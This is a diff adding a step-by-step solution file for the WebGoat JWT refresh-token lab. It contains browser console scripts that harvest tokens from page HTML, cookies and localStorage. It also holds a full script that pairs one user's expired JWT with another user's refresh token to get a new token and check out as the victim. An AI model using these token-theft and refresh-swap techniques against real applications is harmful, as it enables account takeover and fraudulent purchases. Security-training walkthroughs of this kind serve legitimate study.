@@ -1,0 +1,280 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH TOKEN - EXACT SOLUTION                     ║
+║   Based on actual WebGoat behavior                       ║
+╚═══════════════════════════════════════════════════════════╝
+
+📋 WHAT YOU DISCOVERED:
+
+Clicking "Checkout" sends this token:
+eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0...
+
+Decoded: {"user":"Jerry","admin":"false"}
+
+Response: "User is not Tom but Jerry, please try again"
+
+This means WebGoat wants TOM to checkout, not Jerry!
+
+═══════════════════════════════════════════════════════════
+
+🎯 THE SOLUTION - 3 STEPS
+
+STEP 1: Get YOUR (Jerry's) refresh_token
+STEP 2: Use refresh token manipulation attack
+STEP 3: Checkout as Tom
+
+═══════════════════════════════════════════════════════════
+
+📍 STEP 1: Extract YOUR Refresh Token
+═══════════════════════════════════════════════════════════
+
+Your current access token (from the checkout button):
+eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w
+
+This token was sent in the Authorization header when you clicked
+the Checkout button. But where is the refresh_token?
+
+OPTION A: Check the lesson page for a "Login" button
+→ Click it and check Network tab for refresh_token in response
+
+OPTION B: Look for tokens in the page HTML
+→ Paste this in Console (F12):
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Search page for refresh_token
+const html = document.documentElement.innerHTML;
+const match = html.match(/refresh_token["']?\s*:\s*["']([^"']+)/);
+if (match) {
+    console.log('✓ Found refresh_token:', match[1]);
+    window.myRefreshToken = match[1];
+} else {
+    console.log('✗ Not found in HTML');
+    console.log('Check Network tab when clicking buttons');
+}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+OPTION C: Check cookies/localStorage
+→ Paste this in Console:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Check storage for tokens
+console.log('Cookies:', document.cookie);
+console.log('localStorage:', localStorage);
+console.log('sessionStorage:', sessionStorage);
+
+// Look for refresh token
+for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    if (key.includes('refresh') || key.includes('token')) {
+        console.log(`✓ localStorage.${key}:`, localStorage.getItem(key));
+    }
+}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+OPTION D: Try calling the newToken endpoint to get refresh token
+→ The page might give you one if you request it:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Try to get a new token (this might return refresh_token)
+fetch('/WebGoat/JWT/refresh/newToken', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({})
+}).then(r => r.json()).then(d => {
+    console.log('Response:', d);
+    if (d.refresh_token) {
+        console.log('✓ Got refresh_token:', d.refresh_token);
+        window.myRefreshToken = d.refresh_token;
+    }
+});
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+═══════════════════════════════════════════════════════════
+
+📍 STEP 2: Execute the Refresh Token Manipulation Attack
+═══════════════════════════════════════════════════════════
+
+Once you have YOUR refresh_token, paste this in Console:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+(async function() {
+    // Tom's expired token from the log file
+    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+    
+    // YOUR refresh token (replace this with actual value)
+    const MY_REFRESH_TOKEN = window.myRefreshToken || 'PASTE_YOUR_REFRESH_TOKEN_HERE';
+    
+    if (!MY_REFRESH_TOKEN || MY_REFRESH_TOKEN === 'PASTE_YOUR_REFRESH_TOKEN_HERE') {
+        console.error('❌ Please set window.myRefreshToken first!');
+        console.log('Run STEP 1 to find your refresh token');
+        return;
+    }
+    
+    console.log('%c[1] Tom\'s expired token (from log)', 'color: cyan; font-weight: bold');
+    console.log('Token:', TOMS_EXPIRED_TOKEN.substring(0, 50) + '...');
+    console.log('Decoded:', JSON.parse(atob(TOMS_EXPIRED_TOKEN.split('.')[1])));
+    
+    console.log('%c[2] Your refresh token', 'color: cyan; font-weight: bold');
+    console.log('Token:', MY_REFRESH_TOKEN.substring(0, 50) + '...');
+    
+    // THE ATTACK: Use Tom's expired token + YOUR refresh token
+    console.log('%c[3] ⚡ Executing refresh token manipulation...', 'color: red; font-weight: bold');
+    
+    const refreshResp = await fetch('/WebGoat/JWT/refresh/newToken', {
+        method: 'POST',
+        headers: {
+            'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,  // ← Tom's expired token
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            refresh_token: MY_REFRESH_TOKEN  // ← YOUR refresh token
+        })
+    });
+    
+    if (!refreshResp.ok) {
+        console.error('❌ Refresh failed:', refreshResp.status, refreshResp.statusText);
+        const text = await refreshResp.text();
+        console.log('Response:', text);
+        return;
+    }
+    
+    const refreshData = await refreshResp.json();
+    const tomsNewToken = refreshData.access_token;
+    
+    console.log('%c✅ SUCCESS! Got Tom\'s NEW token!', 'color: green; font-weight: bold; font-size: 16px');
+    console.log('Tom\'s new token:', tomsNewToken);
+    
+    // Decode and verify it's Tom's token
+    const decoded = JSON.parse(atob(tomsNewToken.split('.')[1]));
+    console.log('Decoded:', decoded);
+    console.log(`User: ${decoded.user} ${decoded.user === 'Tom' ? '✅' : '❌'}`);
+    
+    // STEP 3: Checkout as Tom
+    console.log('%c[4] 🛒 Checking out as Tom...', 'color: cyan; font-weight: bold');
+    
+    const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {
+        method: 'POST',
+        headers: {
+            'Authorization': 'Bearer ' + tomsNewToken,
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+    });
+    
+    const checkoutData = await checkoutResp.json();
+    
+    if (checkoutData.lessonCompleted) {
+        console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS!', 'color: white; background: green; font-size: 18px; font-weight: bold; padding: 10px');
+        console.log('Response:', checkoutData);
+    } else {
+        console.log('%c⚠️ Checkout response:', 'color: orange; font-weight: bold');
+        console.log(checkoutData);
+        
+        if (checkoutData.feedback) {
+            console.log('Feedback:', checkoutData.feedback);
+        }
+    }
+    
+    // Store for manual testing
+    window.tomsNewToken = tomsNewToken;
+    console.log('\n💡 Token saved to: window.tomsNewToken');
+    
+})();
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+═══════════════════════════════════════════════════════════
+
+📍 STEP 3: Manual Checkout (if needed)
+═══════════════════════════════════════════════════════════
+
+If the script didn't complete checkout, use Tom's token manually:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Use Tom's new token to checkout
+fetch('/WebGoat/JWT/refresh/checkout', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + window.tomsNewToken,
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest'
+    }
+}).then(r => r.json()).then(d => {
+    console.log('Result:', d);
+    if (d.lessonCompleted) {
+        console.log('🎉 SUCCESS!');
+    }
+});
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+═══════════════════════════════════════════════════════════
+
+🔍 DEBUGGING - If Still Getting "User is not Tom but Jerry"
+═══════════════════════════════════════════════════════════
+
+Check what user is in the token:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Decode the token being used
+function decodeToken(token) {
+    const payload = token.split('.')[1];
+    return JSON.parse(atob(payload));
+}
+
+// Check Tom's new token
+console.log('Token payload:', decodeToken(window.tomsNewToken));
+// Should show: {"user": "Tom", ...}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+If it still shows "Jerry", then the refresh attack didn't work.
+This means:
+1. Your refresh_token is wrong
+2. The endpoint validates token ownership (no vulnerability)
+3. The lesson works differently
+
+═══════════════════════════════════════════════════════════
+
+⚠️ IMPORTANT NOTES
+═══════════════════════════════════════════════════════════
+
+Your current token (Jerry):
+eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w
+
+Decoded:
+{
+  "user": "Jerry",
+  "admin": "false"
+}
+
+Tom's expired token (from log):
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+
+Decoded:
+{
+  "iat": 1526131411,
+  "exp": 1526217811,
+  "admin": "false",
+  "user": "Tom"
+}
+
+The attack:
+- Send Tom's EXPIRED token in Authorization header
+- Send YOUR (Jerry's) refresh_token in body
+- Server should return NEW token for Tom
+- Use Tom's NEW token to checkout
+
+═══════════════════════════════════════════════════════════
+
+📚 SUMMARY
+═══════════════════════════════════════════════════════════
+
+1. ✅ You have Jerry's access token (from checkout button)
+2. ❓ You need Jerry's refresh_token (find it with STEP 1)
+3. ⚡ Use refresh token manipulation (STEP 2)
+4. 🛒 Checkout with Tom's new token (STEP 3)
+
+The key is finding YOUR refresh_token!
+Try the OPTION A/B/C/D scripts in STEP 1 above.
+
+═══════════════════════════════════════════════════════════
